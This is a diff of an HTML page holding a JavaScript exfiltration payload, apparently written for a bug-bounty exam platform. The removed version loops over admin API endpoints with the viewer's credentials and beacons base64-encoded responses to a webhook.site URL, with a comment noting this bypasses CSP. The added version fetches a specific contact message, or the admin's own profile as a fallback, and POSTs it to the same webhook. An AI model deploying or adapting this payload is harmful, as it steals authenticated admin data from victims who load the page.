@@ -1,33 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Bug Report Support</title>
-</head>
 <body>
-    <h1>System Diagnostic in Progress...</h1>
     <script>
-        const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
         const base = "https://api-bugbounty-exam.hashacademy.co";
-        
-        // List of high-value targets for flags
-        const targets = [
-            "/api/v1/auth/me",
-            "/api/admin/stats",
-            "/api/v1/admin/logs"
-        ];
+        const msgId = "69ea3f53bee6d6b7c66457d3";
 
-        targets.forEach(path => {
-            fetch(base + path, { credentials: 'include' })
-                .then(response => response.text())
-                .then(data => {
-                    // Send result back to webhook using Image to bypass strict CSP
-                    const leak = btoa(data).substring(0, 800); // Base64 encode and trim
-                    new Image().src = `${webhook}/?path=${btoa(path)}&data=${leak}`;
-                })
-                .catch(err => {
-                    new Image().src = `${webhook}/?err=${btoa(path)}`;
+        // Attempt to fetch the admin's view of this specific message
+        fetch(`${base}/api/v1/contact/messages/${msgId}`, { credentials: "include" })
+            .then(r => r.json())
+            .then(data => {
+                fetch(webh, {
+                    method: "POST",
+                    body: JSON.stringify({ type: "MESSAGE_EXFIL", payload: data })
                 });
-        });
+            })
+            .catch(err => {
+                // Fallback to general admin profile if message fetch fails
+                fetch(`${base}/api/v1/auth/me`, { credentials: "include" })
+                    .then(r => r.text())
+                    .then(d => fetch(webh, { method: "POST", body: d }));
+            });
     </script>
 </body>
 </html>
